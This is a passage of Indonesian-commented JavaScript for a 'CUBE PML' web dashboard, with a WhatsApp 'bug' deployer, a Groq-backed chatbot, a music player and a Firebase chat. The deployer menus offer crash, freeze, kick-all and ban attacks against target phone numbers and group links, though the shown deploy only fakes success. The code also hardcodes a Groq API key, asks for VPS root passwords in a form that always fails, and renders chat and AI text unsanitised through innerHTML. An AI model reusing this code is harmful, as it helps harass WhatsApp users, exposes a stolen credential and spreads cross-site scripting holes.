        Swal.close();
        ErenAlert.success("Success!", "Deploy has been deployed to " + target);
        
        // Tambahkan ke riwayat otomatis
        addHistory("Deploy Bug WA: " + target, "SUCCESS", "status-success");
    }, 3000);
}
function updateBugUI(mode) {
    // 1. Reset status aktif tombol tab
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    
    const inputIcon = document.getElementById('input-icon');
    const inputField = document.getElementById('bug-target');
    const labelBug = document.getElementById('label-bug');
    const selectBug = document.getElementById('bug-select');

    if (mode === 'grup') {
        // Aktifkan tab Grup
        document.getElementById('tab-grup').classList.add('active');
        
        // Ubah Ikon jadi Link & Placeholder jadi link grup
        inputIcon.className = "fa-solid fa-link";
        inputField.placeholder = "https://chat.whatsapp.com/....";
        
        // Ubah Label & Isi Dropdown
        labelBug.innerText = "PILIH BUG GRUP";
        selectBug.innerHTML = `
            <option>FORCLOSE ALL WHATSAPP GROUP</option>
            <option>GC CRASH NEW</option>
            <option>KICK ALL MEMBER</option>
            <option>INVISIBLE ALL WHATSAPP GROUP</option>
            <option>IOS ALL GROUP</option>
        `;
    } 
    else if (mode === 'standar') {
        // Aktifkan tab Standar
        document.getElementById('tab-standar').classList.add('active');
        
        // Ubah Ikon jadi HP & Placeholder jadi nomor
        inputIcon.className = "fa-solid fa-mobile-button";
        inputField.placeholder = "Contoh: +62xxxxxxxxxxx";
        
        // Ubah Label & Isi Dropdown
        labelBug.innerText = "PILIH BUG STANDAR";
        selectBug.innerHTML = `
                <option>BLANK NEW</option>
    <option>VIRTEX HARD</option>
    <option>BLANK UI</option>
    <option>UI FREEZE</option>
    <option>FREEZE X BLANK</option>
    <option>DELAY INVISIBLE</option>
    <option>FC IOS INVISIBLE</option>
    <option>IOS FREEZE</option>
    <option>DELAY COMBO</option>
        `;
    }
    else {
        // Mode Custom
        document.getElementById('tab-custom').classList.add('active');
        inputIcon.className = "fa-solid fa-mobile-button";
        inputField.placeholder = "Contoh: +62xxxxxxxxxxx";
        labelBug.innerText = "PILIH BAN / UNBAN";
        selectBug.innerHTML = `
    <option>BAN TRIAL</option>
    <option>BAN PERMANENT</option>
    <option>UNBAN 24 JAM</option>
    <option>UNBAN 2 JAM</option>
        `;
        // Tambahkan isi sendiri untuk mode custom jika perlu
    }
}
// GUNAKAN API KEY GROQ KAMU DI SINI
  const GROQ_API_KEY = "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"; 

  async function sendAiMessage() {
    const input = document.getElementById('ai-input');
    const chatBox = document.getElementById('ai-chat-box');
    
    if (!input || !chatBox) return;
    const userMsg = input.value.trim();
    
    // Jangan kirim apa pun jika teks kosong DAN tidak ada lampiran gambar
    if (!userMsg && !selectedAiImageBase64) return;

    // Ambil data gambar yang terpilih
    const imagePayload = selectedAiImageBase64;
    
    // Reset form input & preview gambar segera demi kenyamanan user
    clearSelectedAiImage();
    input.value = "";

    // 1. Tampilkan Pesan User (Gemini dark-style via class)
    let userBubbleHtml = `
        <div class="ai-msg ai-msg--user">
            ${imagePayload ? `<img src="${imagePayload}" class="ai-msg__img" alt="Preview">` : ''}
            ${userMsg ? `<div class="ai-msg__text">${userMsg}</div>` : ''}
        </div>
    `;

    chatBox.innerHTML += userBubbleHtml;

    // 2. Setup Loading Animation (typing dots ala Gemini)
    const typingId = "typing-" + Date.now();
    chatBox.innerHTML += `
        <div id="${typingId}" class="ai-typing" aria-live="polite">
            <span class="ai-typing__dot"></span>
            <span class="ai-typing__dot"></span>
            <span class="ai-typing__dot"></span>
            <span class="ai-typing__label">CUBE AI IS PROCESSING...</span>
        </div>
    `;

    chatBox.scrollTo({ top: chatBox.scrollHeight, behavior: 'smooth' });

    try {
        // --- TAMBAHAN LOGIKA MULTIMODAL UNTUK GROQ ---
        let contentStructure = [];
        
        if (userMsg) {
            contentStructure.push({ type: "text", text: userMsg });
        }
        
        if (imagePayload) {
            contentStructure.push({
                type: "image_url",
                image_url: { url: imagePayload }
            });
        }
        // Tentukan model: Menggunakan model vision 90b terbaru yang aktif di Groq (FIXED)
        const targetModel = imagePayload ? "llama-3.2-90b-vision-preview" : "llama-3.3-70b-versatile";
        
        // Panggil API Groq - Menggunakan model Llama 3 / Vision
        const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${GROQ_API_KEY}` 
            },
            body: JSON.stringify({
                model: targetModel, // Berubah otomatis sesuai tipe input data
                messages: [
                    {
                        role: "system",
                        content: `Kamu adalah Cube AI, asisten pribadi dari project CUBE PML. 
                        Kepribadianmu sekarang sangat baik, lembut, ramah, dan selalu siap membantu user kapan saja. 
                        Jawablah setiap pertanyaan dengan benar, informatif, dan gunakan bahasa Indonesia yang sopan serta menyentuh hati. 
                        Jangan pernah terlihat marah atau dingin. Selalu tunjukkan bahwa kamu peduli pada user. dan kamu adalah buatan agung yang sangat ganteng. jika ada yang tanya agung siapa maka jawab agung dwi purnomo daerah sidorejo, orang yang paling tampan, dan baik hati. Kamu juga bisa mengenali isi gambar yang dikirimkan oleh pengguna.`
                    },
                    {
                        role: "user",
                        content: imagePayload ? contentStructure : userMsg // Jika gambar ada, kirim struktur array, jika teks biasa kirim string biasa
                    }
                ],
                temperature: 0.7
            })
        });

        const data = await response.json();
        
        if (data.error) throw new Error(data.error.message);
        
        // Pengambilan teks pada format Groq/OpenAI
        const aiText = data.choices[0].message.content;
        
        const typingElem = document.getElementById(typingId);
        if (typingElem) typingElem.remove();

        // 4. Tampilkan Jawaban AI
        chatBox.innerHTML += `
            <div style="background: rgba(0,255,0,0.05); padding: 15px 20px; border-radius: 18px 18px 18px 0; align-self: flex-start; max-width: 85%; border: 1px solid rgba(0,255,0,0.2); font-family: 'Rajdhani'; line-height: 1.6; margin-bottom: 12px; color: #e0e0e0; box-shadow: 0 4px 20px rgba(0,255,0,0.05);">
                <div style="font-size: 0.65rem; color: #0f0; font-family: 'Orbitron'; margin-bottom: 5px; letter-spacing: 1px;">CUBE AI CORE (PML)</div>
                ${aiText}
            </div>
        `;

    } catch (error) {
        console.error("AI Error:", error);
        const typingElem = document.getElementById(typingId);
        if (typingElem) {
            typingElem.innerHTML = `<span style="color:#ff4444; font-family: 'Orbitron'; font-size: 0.7rem;"><i class="fa-solid fa-triangle-exclamation"></i> ERROR: SINKRONISASI GROQ GAGAL.</span>`;
        }
    }
    chatBox.scrollTo({ top: chatBox.scrollHeight, behavior: 'smooth' });
}
  function openInstallForm(type) {
    const menu = document.getElementById('install-menu');
    const formArea = document.getElementById('install-form-area');
    const formTitle = document.getElementById('form-title');
    const formInputs = document.getElementById('form-inputs');
    
    menu.style.display = 'none';
    formArea.style.display = 'block';
    formInputs.innerHTML = ''; // Reset input

    if (type === 'panel') {
        formTitle.innerText = "INSTALL PTERODACTYL PANEL";
        formInputs.innerHTML = `
            <input type="text" id="ins-subdomain" placeholder="Domain/Subdomain (ex: panel.domain.com)" class="ins-input">
            <input type="text" id="ins-ip" placeholder="IP VPS" class="ins-input">
            <input type="password" id="ins-pw" placeholder="Password Root VPS" class="ins-input">
        `;
    } else if (type === 'wings') {
        formTitle.innerText = "INSTALL PTERODACTYL WINGS";
        formInputs.innerHTML = `
            <input type="text" id="ins-node" placeholder="Node Subdomain (ex: node.domain.com)" class="ins-input">
            <input type="text" id="ins-ip" placeholder="IP VPS" class="ins-input">
            <input type="password" id="ins-pw" placeholder="Password Root VPS" class="ins-input">
        `;
    } else if (type === 'tema') {
        formTitle.innerText = "INSTALL ENIGMA/STELLAR THEME";
        formInputs.innerHTML = `
            <p style="color: #ccc; font-size: 0.9rem;">*Pastikan Panel sudah terinstall sebelum memasang tema.</p>
            <input type="text" id="ins-theme-link" placeholder="Link Download Tema (.zip)" class="ins-input">
            <input type="password" id="ins-pw" placeholder="Password Root VPS (untuk akses file)" class="ins-input">
            <select id="ins-theme-type" class="ins-input" style="background:#000; color:#fff;">
                <option value="enigma">Enigma Theme</option>
                <option value="stellar">Stellar Theme</option>
            </select>
        `;
    }
}

function backToInstallMenu() {
    document.getElementById('install-menu').style.display = 'grid';
    document.getElementById('install-form-area').style.display = 'none';
}

function processInstall() {
    Swal.fire({
        title: 'Memulai Instalasi...',
        text: 'Sistem sedang menghubungkan ke VPS. Mohon tunggu.',
        icon: 'info',
        background: '#000',
        color: '#0f0',
        showConfirmButton: false,
        timer: 3000
    }).then(() => {
        Swal.fire('Gagal!', 'Koneksi SSH ditolak. Pastikan IP dan Password VPS benar.', 'error');
    });
}
function logoutSystem() {
    const sidebar = document.getElementById('sidebar');
    
    // 1. Jika seandainya sidebar lagi terbuka ('open'), panggil fungsi aslimu buat nutup
    if (sidebar && sidebar.classList.contains('open')) {
        if (typeof toggleSidebar === 'function') {
            toggleSidebar(); // Mengembalikan sidebar & overlay ke posisi semula secara legal
        }
    }

    // 2. Tampilkan Pop-up Konfirmasi Logout menggunakan SweetAlert2
    Swal.fire({
        title: 'Logout?',
        text: "Apakah Anda yakin ingin logout?",
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#ff4444',
        cancelButtonColor: '#333',
        confirmButtonText: 'Ya, Logout',
        background: 'rgba(10, 10, 10, 0.95)', 
        color: '#fff',
        fontFamily: 'Orbitron'
    }).then((result) => {
        if (result.isConfirmed) {
            // HAPUS DATA LOGIN
            localStorage.removeItem('isLoggedIn');
            localStorage.removeItem('activeUser');
            localStorage.removeItem('cube_balance'); 
            localStorage.removeItem('cube_role');
            
            location.reload(); // Refresh halaman, kembali ke menu login
        }
    });
}
// Jalankan pengecekan otomatis saat halaman dimuat
window.onload = function() {
    const status = localStorage.getItem('isLoggedIn');
    const savedUser = localStorage.getItem('activeUser');

    if (status === 'true' && savedUser) {
        currentUser = savedUser;
        
        // Lewati layar login, langsung ke dashboard
        document.getElementById('screen-login').classList.remove('active');
        document.getElementById('screen-dashboard').style.display = 'block';
        document.getElementById('top-bar').style.display = 'flex';
        
        // Update nama di dashboard
        const dashUserElem = document.getElementById('display-user-dash');
        if (dashUserElem) dashUserElem.innerText = savedUser.toUpperCase();
        
        // Load data lainnya (Panel/History)
        privateChatList = JSON.parse(localStorage.getItem('cube_chat_rooms_' + currentUser)) || [];
        renderPrivateRooms();
        listenMessages('global');
        loadUserData(); 
        loadHistory();
    }
};
const swiper = new Swiper('.mySwiper', {
  // Opsi dasar agar bisa digeser
  slidesPerView: 1,
  spaceBetween: 20,
  loop: true, // agar bisa di-looping
  pagination: {
    el: '.swiper-pagination',
    clickable: true,
  },
  // Tambahkan ini jika ingin bisa digeser pakai mouse di PC
  grabCursor: true, 
});

function topUpSaldo() {
    Swal.fire({
        title: 'Isi Saldo',
        text: 'Gunakan fitur QRIS untuk menambah saldo.',
        icon: 'info',
        confirmButtonText: 'Buka QRIS',
        background: '#000',
        color: '#fff'
    }).then(() => {
        showSection('genqris'); // Ganti ke ID section QRIS kamu
    });
}

function tukarSaldo() {
    ErenAlert.error("Fitur Terkunci", "Minimal saldo untuk tukar adalah Rp 50.000");
}

// Jalankan update saat halaman pertama kali dibuka
updateBalanceUI();

// Modifikasi fungsi showScreen (Pastikan ini ada di kodinganmu)
function showScreen(screenId) {
    // Sembunyikan semua screen
    document.querySelectorAll('.screen-content').forEach(s => s.style.display = 'none');
    // Tampilkan screen yang dipilih
    document.getElementById(screenId).style.display = 'block';
    
    // Jika buka wallet, update UI
    if(screenId === 'screen-wallet') updateBalanceUI();
}
// Data Lagu Sampel Bebas Royalti (Bisa diganti URL audio kamu sendiri nanti)
const musicPlaylist = [
    {
        title: "Montagem Tenta",
        artist: "Neon Drivettt",
        cover: "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=150",
        url: "https://docs.google.com/uc?export=download&id=1YrPSeyhBg-g_YwdVWO335rovEqO4sGHa"
    },
    {
        title: "Synthwave Nights",
        artist: "Cube PML Producer",
        cover: "https://images.unsplash.com/photo-1614613535308-eb5fbd3d2c17?w=150",
        url: "https://s.gotube.pro/DtcFoa"
    },
    {
        title: "Digital Database",
        artist: "Arie Project",
        cover: "https://images.unsplash.com/photo-1508700115892-45ecd05ae2ad?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3"
    },
    {
        title: "Cruel Summer",
        artist: "Taylor Swift",
        cover: "https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
    },
    {
        title: "As It Was",
        artist: "Harry Styles",
        cover: "https://images.unsplash.com/photo-1498038432885-c6f3f1b912ee?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3"
    },
    {
        title: "Starboy",
        artist: "The Weeknd",
        cover: "https://images.unsplash.com/photo-1614613535308-eb5fbd3d2c17?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3"
    },
    {
        title: "Sial",
        artist: "Mahalini",
        cover: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-4.mp3"
    },
    {
        title: "Jiwa Yang Bersedih",
        artist: "Ghea Indrawari",
        cover: "https://images.unsplash.com/photo-1470225620780-dba8ba36b745?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-5.mp3"
    },
    {
        title: "Gata Only",
        artist: "FloyyMenor, Cris Mj",
        cover: "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-6.mp3"
    },
    {
        title: "Night Changes",
        artist: "One Direction",
        cover: "https://images.unsplash.com/photo-1459749411175-04bf5292ceea?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-7.mp3"
    },
    {
        title: "Tak Segampang Itu",
        artist: "Anggi Marito",
        cover: "https://images.unsplash.com/photo-1487180142328-054b783fc471?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-8.mp3"
    },
    {
        title: "Espresso",
        artist: "Sabrina Carpenter",
        cover: "https://images.unsplash.com/photo-1506157786151-b8491531f063?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-9.mp3"
    },
    {
        title: "Birds of a Feather",
        artist: "Billie Eilish",
        cover: "https://images.unsplash.com/photo-1501386761578-eac5c94b800a?w=150",
        url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
    }
];

let currentTrackIndex = 0;
let isPlaying = false;
const audioPlayer = new Audio();

// Membuat list lagu di HTML secara otomatis
function initSpotifyPlaylist() {
    const listContainer = document.getElementById('spotify-track-list');
    if (!listContainer) return;
    
    listContainer.innerHTML = '';
    musicPlaylist.forEach((track, index) => {
        const item = document.createElement('div');
        item.className = `track-item ${index === currentTrackIndex ? 'active' : ''}`;
        item.setAttribute('onclick', `selectTrack(${index})`);
        item.innerHTML = `
            <img src="${track.cover}">
            <div class="track-info">
                <div class="track-title">${track.title}</div>
                <div class="track-artist">${track.artist}</div>
            </div>
            <i class="fa-solid fa-volume-high" style="color:#1DB954; display:${index === currentTrackIndex && isPlaying ? 'block' : 'none'};"></i>
        `;
        listContainer.appendChild(item);
    });
}

// Memilih/mengklik lagu dari daftar
function selectTrack(index) {
    currentTrackIndex = index;
    const track = musicPlaylist[currentTrackIndex];
    
    audioPlayer.src = track.url;
    document.getElementById('player-album-art').src = track.cover;
    document.getElementById('player-track-title').innerText = track.title;
    document.getElementById('player-track-artist').innerText = track.artist;
    
    initSpotifyPlaylist(); // Refresh list agar highlight pindah
    playAudio();
}

// Play & Pause Logic
function togglePlayPause() {
    if (audioPlayer.src === "" && musicPlaylist.length > 0) {
        selectTrack(0);
        return;
    }
    if (isPlaying) {
        pauseAudio();
    } else {
        playAudio();
    }
}

function playAudio() {
    audioPlayer.play().then(() => {
        isPlaying = true;
        document.getElementById('play-icon').className = "fa-solid fa-pause";
        initSpotifyPlaylist();
    }).catch(e => console.log("Gagal memutar otomatis, perlu interaksi user."));
}

function pauseAudio() {
    audioPlayer.pause();
    isPlaying = false;
    document.getElementById('play-icon').className = "fa-solid fa-play";
    initSpotifyPlaylist();
}

// Navigasi Next & Prev
function nextTrack() {
    currentTrackIndex = (currentTrackIndex + 1) % musicPlaylist.length;
    selectTrack(currentTrackIndex);
}

function prevTrack() {
    currentTrackIndex = (currentTrackIndex - 1 + musicPlaylist.length) % musicPlaylist.length;
    selectTrack(currentTrackIndex);
}

// Update Timeline Progress Bar Secara Real-time
audioPlayer.addEventListener('timeupdate', () => {
    const current = audioPlayer.currentTime;
    const duration = audioPlayer.duration || 0;
    
    // Hitung persen progress bar
    const progressPercent = (current / duration) * 100;
    document.getElementById('track-progress-fill').style.width = `${progressPercent}%`;
    
    // Update teks penunjuk menit/detik
    document.getElementById('track-current-time').innerText = formatTime(current);
    document.getElementById('track-total-duration').innerText = formatTime(duration);
});

// Otomatis putar lagu berikutnya jika lagu selesai
audioPlayer.addEventListener('ended', () => {
    nextTrack();
});

// Lompat durasi lagu saat progress bar diklik
function seekAudio(event) {
    const wrapper = event.currentTarget;
    const clickX = event.offsetX;
    const width = wrapper.clientWidth;
    const duration = audioPlayer.duration;
    
    if(duration) {
        audioPlayer.currentTime = (clickX / width) * duration;
    }
}

// Helper Merapikan format waktu menit:detik
function formatTime(seconds) {
    const min = Math.floor(seconds / 60);
    const sec = Math.floor(seconds % 60);
    return `${min}:${sec < 10 ? '0' : ''}${sec}`;
}

// Jalankan inisialisasi playlist saat web dimuat pertama kali
document.addEventListener('DOMContentLoaded', () => {
    initSpotifyPlaylist();
});
let activeRoomId = "global";
let currentChatListener = null;

// Ambil riwayat room private lokal agar daftar chat tidak hilang saat refresh
let privateChatList = JSON.parse(localStorage.getItem('cube_chat_rooms_' + currentUser)) || [];

// Fungsi memulai obrolan baru berdasarkan Username teman
function startPrivateChat() {
    Swal.fire({
        title: 'Mulai Chat Private',
        input: 'text',
        inputLabel: 'Masukkan Username Teman:',
        inputPlaceholder: 'Contoh: lev_degdame',
        showCancelButton: true,
        background: '#111b21',
        color: '#fff',
        confirmButtonColor: '#0f0',
        confirmButtonText: 'Cari'
    }).then((result) => {
        if (result.isConfirmed && result.value.trim()) {
            const targetUser = result.value.trim().toLowerCase();
            
            if (targetUser === currentUser.toLowerCase()) {
                return ErenAlert.error("Gagal", "Tidak bisa chat diri sendiri!");
            }

            ErenAlert.loading("Memeriksa pengguna...");
            
            // Cek apakah user target terdaftar di database Firebase
            db.ref("cube_users/" + targetUser).once("value", function(snapshot) {
                Swal.close();
                if (!snapshot.exists()) {
                    ErenAlert.error("Gagal", "Username tidak ditemukan di database!");
                } else {
                    // Buat ID unik untuk room gabungan berdua agar tidak tertukar
                    const usersArray = [currentUser.toLowerCase(), targetUser].sort();
                    const privateRoomId = `p2p_${usersArray[0]}_${usersArray[1]}`;

                    if (!privateChatList.includes(targetUser)) {
                        privateChatList.push(targetUser);
                        localStorage.setItem('cube_chat_rooms_' + currentUser, JSON.stringify(privateChatList));
                    }
                    
                    renderPrivateRooms();
                    switchChatRoom(privateRoomId, targetUser.toUpperCase(), false);
                }
            });
        }
    });
}


// Render list daftar teman chat yang pernah dihubungi
function renderPrivateRooms() {
    const container = document.getElementById('private-rooms-container');
    if(!container) return;
    container.innerHTML = "";
    
    privateChatList.forEach(user => {
        const usersArray = [currentUser.toLowerCase(), user.toLowerCase()].sort();
        const roomId = `p2p_${usersArray[0]}_${usersArray[1]}`;
        
        container.innerHTML += `
            <div class="room-item" id="room-${roomId}" onclick="switchChatRoom('${roomId}', '${user.toUpperCase()}', false)">
                <div class="room-avatar"><i class="fa-solid fa-user"></i></div>
                <div style="text-align:left;">
                    <div style="font-weight:bold; color:#fff;">${user.toUpperCase()}</div>
                    <div style="font-size:0.75rem; color:#8696a0;">Chat Pribadi</div>
                </div>
            </div>`;
    });
}

// Fungsi pindah ruang obrolan (Dari global ke pribadi atau sebaliknya)
function switchChatRoom(roomId, roomTitle, isGlobal = true) {
    activeRoomId = roomId;
    
    document.querySelectorAll('.room-item').forEach(el => el.classList.remove('active'));
    const selectedRoomElement = document.getElementById('room-' + roomId) || document.getElementById('room-global');
    if(selectedRoomElement) selectedRoomElement.classList.add('active');

    document.getElementById('active-room-title').innerText = roomTitle;
    document.getElementById('active-room-avatar').innerHTML = isGlobal ? `<i class="fa-solid fa-users"></i>` : `<i class="fa-solid fa-user"></i>`;
    document.getElementById('active-room-status').innerText = isGlobal ? "Semua Orang" : "Private Chat";

    listenMessages(roomId);
}

// Mendengarkan data pesan yang keluar-masuk secara Realtime dari Awan Firebase
function listenMessages(roomId) {
    if (currentChatListener) {
        currentChatListener.off(); // Matikan listener room lama agar tidak bentrok
    }

    const msgBox = document.getElementById('chat-msg-box');
    msgBox.innerHTML = `<div style="text-align:center; color:#8696a0; font-size:0.8rem;"><i class="fa-solid fa-spinner fa-spin"></i> Memuat Pesan...</div>`;

    currentChatListener = db.ref("messages/" + roomId).limitToLast(100);
    
    currentChatListener.on("value", function(snapshot) {
        msgBox.innerHTML = "";
        if (!snapshot.exists()) {
            msgBox.innerHTML = `<div style="text-align:center; color:#444; font-size:0.8rem; margin-top:20px;">Belum ada percakapan disini.</div>`;
            return;
        }

        snapshot.forEach(child => {
            const data = child.val();
            const isMe = data.sender.toLowerCase() === currentUser.toLowerCase();
            const bubbleClass = isMe ? "sent" : "received";
            
            let mediaContent = "";
            if (data.mediaType === "image") {
                mediaContent = `<img src="${data.mediaUrl}" class="msg-media" onclick="window.open('${data.mediaUrl}', '_blank')">`;
            } else if (data.mediaType === "video") {
                mediaContent = `<video src="${data.mediaUrl}" controls class="msg-media"></video>`;
            }

            msgBox.innerHTML += `
                <div class="msg-bubble ${bubbleClass}">
                    ${!isMe ? `<span class="msg-sender">${data.sender.toUpperCase()}</span>` : ''}
                    <div style="color:#fff;">${data.text}</div>
                    ${mediaContent}
                    <span class="msg-meta">${formatChatTime(data.timestamp)}</span>
                </div>`;
        });
        msgBox.scrollTop = msgBox.scrollHeight;
    });
}

// === KUNCI PERBAIKAN 2: FUNGSI KIRIM PESAN YANG STABIL ===
function sendChatMessage() {
    const input = document.getElementById('chat-text-input');
    if (!input) return; // Mencegah crash jika elemen input tidak ditemukan

    const text = input.value.trim();
    if (!text) return; // Jika kosong, abaikan

    // Mengirim pesan ke Firebase secara realtime
    db.ref("messages/" + activeRoomId).push({
        sender: currentUser || "Guest", // Gunakan 'Guest' jika nama user belum terbaca
        text: text,
        timestamp: Date.now()
    }).then(() => {
        input.value = ""; // Kosongkan input HANYA setelah pesan sukses terkirim ke cloud
    }).catch((error) => {
        console.error("Gagal mengirim ke Firebase:", error);
    });
}

// Mengirim File Foto / Video (Menggunakan format Base64 agar langsung masuk Realtime DB tanpa storage eksternal)
function handleMediaUpload(inputElement) {
    const file = inputElement.files[0];
    if (!file) return;

    if (file.size > 2 * 1024 * 1024) {
        return ErenAlert.error("Gagal", "Ukuran media terlalu besar! Maksimal 2MB agar database lancar.");
    }

    ErenAlert.loading("Mengompres media...");
    const reader = new FileReader();
    
    reader.onload = function(e) {
        Swal.close();
        const base64Data = e.target.result;
        const type = file.type.startsWith('image/') ? 'image' : 'video';

        db.ref("messages/" + activeRoomId).push({
            sender: currentUser,
            text: `📁 Mengirim ${type}`,
            mediaUrl: base64Data,
            mediaType: type,
            timestamp: Date.now()
        });
        inputElement.value = ""; // Reset form input file
    };
    reader.readAsDataURL(file);
}

function formatChatTime(timestamp) {
    const date = new Date(timestamp);
    return date.getHours().toString().padStart(2, '0') + ':' + date.getMinutes().toString().padStart(2, '0');
}

// Sambungkan pemanggilan fungsi agar dimuat otomatis saat bodi login terbuka
const oldWindowLoad = window.onload;
window.onload = function() {
    if (typeof oldWindowLoad === 'function') oldWindowLoad();
    
    const status = localStorage.getItem('isLoggedIn');
    if (status === 'true') {
        renderPrivateRooms();
        listenMessages('global'); // Bebankan pembacaan room global di awal start
    }
};
// Simpan salinan daftar lagu sampel asli di variabel baru (Taruh di atas fungsi)
const originalPlaylist = [...musicPlaylist]; 

function getTrendingTracks(keyword = "") {
    const msgBox = document.getElementById('spotify-track-list');
    
    // Jika kolom pencarian kosong, kembalikan playlist ke daftar lagu lengkap asli
    if (!keyword.trim()) {
        musicPlaylist = [...originalPlaylist];
        initSpotifyPlaylist();
        return;
    }

    const searchKey = keyword.toLowerCase().trim();

    // Saring lagu berdasarkan judul atau nama artis yang cocok
    musicPlaylist = originalPlaylist.filter(track => 
        track.title.toLowerCase().includes(searchKey) || 
        track.artist.toLowerCase().includes(searchKey)
    );

    // Jika lagu yang dicari tidak ada di daftar sampel
    if (musicPlaylist.length === 0) {
        if (msgBox) {
            msgBox.innerHTML = `<div style="text-align:center; color:#666; font-size:0.85rem; padding: 20px;">🔍 Lagu "${keyword}" tidak ditemukan.</div>`;
        }
        return;
    }

    // Segarkan tampilan playlist musik di layar dashboard kamu
    initSpotifyPlaylist();
}
// ==========================================================================
// FIX UTAMA: SINKRONISASI AMAN API YOUTUBE IFRAME PLAYER
// ==========================================================================
let animePlayer;
let animeProgressInterval;
let isYoutubeAPIReady = false; // Flag penanda jika library Google sudah siap

// 1. Memanggil otomatis API Iframe Player dari Google secara asynchronous
(function() {
    if (!document.getElementById('yt-api-script')) {
        const tag = document.createElement('script');
        tag.id = 'yt-api-script';
        tag.src = "https://www.youtube.com/iframe_api";
        const firstScriptTag = document.getElementsByTagName('script')[0];
        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
    }
})();

// 3. Fungsi Utama: Memutar video anime secara dinamis saat card diklik
function playAnimeVideo(title, videoId) {
    // Tampilkan kotak player pembungkus di atas layar dashboard
    const playerBox = document.getElementById('anime-player-box');
    if (playerBox) playerBox.style.display = 'block';
    
    // Setel papan judul nama anime aktif
    const titleElem = document.getElementById('active-anime-title');
    if (titleElem) titleElem.innerText = "PLAYING: " + title.toUpperCase();

    // Reset pelacak waktu lama jika ada
    clearInterval(animeProgressInterval);

    // JIKA PLAYER SUDAH PERNAH DIBUAT: Tinggal oper ID video baru langsung putar
    if (animePlayer && typeof animePlayer.loadVideoById === 'function') {
        animePlayer.loadVideoById(videoId);
        document.querySelector('#anime-play-btn i').className = "fa-solid fa-pause";
        animeProgressInterval = setInterval(updateAnimeProgressBar, 1000);
    } 
    // JIKA PLAYER BELUM ADA: Buat objek YT.Player baru secara aman
    else {
        // Cek darurat jika API Google belum selesai loading di browser, tunggu 500ms lalu coba lagi
        if (!isYoutubeAPIReady || typeof YT === 'undefined' || !YT.Player) {
            console.log("Menunggu API YouTube siap...");
            setTimeout(() => { playAnimeVideo(title, videoId); }, 500);
            return;
        }

        try {
            animePlayer = new YT.Player('anime-youtube-player', {
                videoId: videoId,
                playerVars: {
                    'autoplay': 1,
                    'controls': 0,       // Sembunyikan kontrol bawaan YouTube hitam
                    'rel': 0,            // Matikan rekomendasi video channel lain
                    'modestbranding': 1, // Sembunyikan logo besar watermark YouTube
                    'playsinline': 1,
                    'disablekb': 1       // Matikan fungsi spasi/tombol keyboard
                },
                events: {
                    'onReady': function(e) {
                        e.target.playVideo();
                        document.querySelector('#anime-play-btn i').className = "fa-solid fa-pause";
                        animeProgressInterval = setInterval(updateAnimeProgressBar, 1000);
                    },
                    'onStateChange': function(e) {
                        // Jika video habis terputar, kembalikan tombol ke ikon Play
                        if (e.data === YT.PlayerState.ENDED) {
                            document.querySelector('#anime-play-btn i').className = "fa-solid fa-play";
                            clearInterval(animeProgressInterval);
                        }
                    }
                }
            });
        } catch (err) {
            console.error("Gagal melakukan inisialisasi player YouTube:", err);
        }
    }
}
// Fungsi Play / Pause video anime kustom
function toggleAnimePlay() {
    if (!animePlayer || typeof animePlayer.getPlayerState !== 'function') return;
    const state = animePlayer.getPlayerState();
    const btnIcon = document.querySelector('#anime-play-btn i');

    if (state === YT.PlayerState.PLAYING) {
        animePlayer.pauseVideo();
        btnIcon.className = "fa-solid fa-play";
        clearInterval(animeProgressInterval);
    } else {
        animePlayer.playVideo();
        btnIcon.className = "fa-solid fa-pause";
        animeProgressInterval = setInterval(updateAnimeProgressBar, 1000);
    }
}

// Update progress bar penunjuk waktu video anime
function updateAnimeProgressBar() {
    if (!animePlayer || typeof animePlayer.getCurrentTime !== 'function') return;
    const currentTime = animePlayer.getCurrentTime();
    const duration = animePlayer.getDuration();

    if (duration > 0) {
        const percentage = (currentTime / duration) * 100;
        document.getElementById('anime-progress-bar').style.width = `${percentage}%`;

        const min = Math.floor(currentTime / 60).toString().padStart(2, '0');
        const sec = Math.floor(currentTime % 60).toString().padStart(2, '0');
        document.getElementById('anime-time-display').innerText = `${min}:${sec}`;
    }
}

// Fitur sentuh/klik geser durasi video anime
function seekAnimeVideo(event) {
    if (!animePlayer || typeof animePlayer.getDuration !== 'function') return;
    const rect = event.currentTarget.getBoundingClientRect();
    const clickX = event.clientX - rect.left;
    const duration = animePlayer.getDuration();
    if (duration > 0) {
        const newTime = (clickX / rect.width) * duration;
        animePlayer.seekTo(newTime, true);
        updateAnimeProgressBar();
    }
}

// Fungsi menutup / menyembunyikan player video anime
function closeAnimePlayer() {
    if (animePlayer && typeof animePlayer.pauseVideo === 'function') {
        animePlayer.pauseVideo();
    }
    clearInterval(animeProgressInterval);
    document.getElementById('anime-player-box').style.display = 'none';
}
// === UPDATE CONFIG FIREBASE TERBARU ===
// === FIX KUNCI: SINKRONISASI INITIALIZE DB2 AGAR TIDAK SALAH ALAMAT ===
const firebaseConfig2 = {
    databaseURL: "https://cube-store-dbe79-default-rtdb.asia-southeast1.firebasedatabase.app"
};

let db2;
try {
    if (typeof firebase !== 'undefined') {
        // Membuat instance app sekunder dengan nama unik agar tidak bentrok dengan config bawaan awal
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig2);
